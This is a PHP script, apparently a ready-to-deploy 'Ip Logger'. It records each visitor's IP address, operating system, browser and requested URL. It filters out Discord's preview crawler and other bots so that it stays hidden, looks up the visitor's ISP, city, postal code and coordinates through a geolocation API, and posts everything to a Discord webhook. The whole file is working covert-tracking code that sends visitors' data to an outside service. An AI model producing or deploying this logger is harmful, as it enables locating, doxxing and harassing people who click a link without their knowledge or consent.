<?php

$Webhook    = "INNIT"; //Webhook here
$WebhookTag = "Website Logs"; //Name this whatever you want
$WebhookAvatar = "http://cdn.onlinewebfonts.com/svg/img_246830.png"; //Change this to your the avatar you prefer
$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"

$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$URL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
						              	'/kalilinux/i'          =>  'KaliLinux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
							'/Mozilla/i'	=>	'Mozila',
							'/Mozilla/5.0/i'=>	'Mozila',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
							'/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/Bot/i'		=>	'BOT Browser',
							'/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$user_os        =   getOS();
$user_browser   =   getBrowser();
$time = date('Y-m-d H:i:s');

if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
    exit();
}

$Curl = curl_init("http://ip-api.com/json/$IP");
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Status = $Info->status;
$Country = $Info->country;
$countryCode = $Info->countryCode;
$Region = $Info->regionName;
$City = $Info->city;
$Tz = $Info->timezone;
$Zip = $Info->zip;
$COORD = "$Info->lat, $Info->lon"; 
$flag = "https://www.countryflags.io/{$countryCode}/flat/64.png";
$timestamp = date("Y-m-d H:i:s");


$hookObject = json_encode([ // Discord Embed Message
    'username'   => "$WebhookTag" , 
    'avatar_url' => "$WebhookAvatar",
    "embeds" => [
        /*
         * Our first embed
         */
        [
            "title" => "Ip Logger",
            
            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",
            
            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => "$timestamp",
            
            // The integer color to be used on the left side of the embed
            "color" => hexdec( "$DEmbedColor" ),
            
            // Footer object
            "footer" => [
                "text" => "",
                "icon_url" => "$WebhookAvatar"
            ],
            "thumbnail" => [
                "url" => "$flag"
            ],
            // Author object
            "author" => [
                "name" => "",
                "url" => ""
            ],
            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "URL Header Logged",
                    "value" => "$URL",
                    "inline" => false
                ],
                [
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ],
                [
                    "name" => "User OS",
                    "value" => "$user_os",
                    "inline" => true
                ],
                [
                    "name" => "User Browser",
                    "value" => "$user_browser",
                    "inline" => true
                ],
                [
                    "name" => "Time",
                    "value" => "$time",
                    "inline" => true
                ],
                [
                    "name" => "ISP",
                    "value" => "$ISP",
                    "inline" => true
                ],
                [
                    "name" => "Status",
                    "value" => "$Status",
                    "inline" => true
                ],
                [
                    "name" => "Browser",
                    "value" => "$Browser",
                    "inline" => false
                ],
                [
                    "name" => "Country",
                    "value" => "$Country",
                    "inline" => true
                ],
                [
                    "name" => "Region",
                    "value" => "$Region",
                    "inline" => true
                ],
                [
                    "name" => "City",
                    "value" => "$City",
                    "inline" => true
                ],
                [
                    "name" => "Timezone",
                    "value" => "$Tz",
                    "inline" => true
                ],
                [
                    "name" => "Postal/Zip",
                    "value" => "$Zip",
                    "inline" => true
                ],
                [
                    "name" => "Coordinates",
                    "value" => "$COORD",
                    "inline" => true
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $Webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

?>
